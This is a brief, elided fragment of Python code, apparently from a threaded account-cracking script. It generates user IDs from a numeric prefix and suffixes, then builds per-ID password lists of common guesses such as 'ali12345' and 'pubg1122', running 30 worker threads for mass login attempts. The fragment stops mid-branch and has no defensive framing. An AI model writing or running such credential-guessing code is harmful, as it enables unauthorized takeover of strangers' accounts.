...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 256704,256705,256706,256707')
		...
		with tred(max_workers=30) as TRT:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'ahmed','yusuf','ali12345','barabe','somalia','ismail12345','ali1122','boss12345','khan','hooyo','pubg','pubg1122']
				if pcs in ['2','02']:
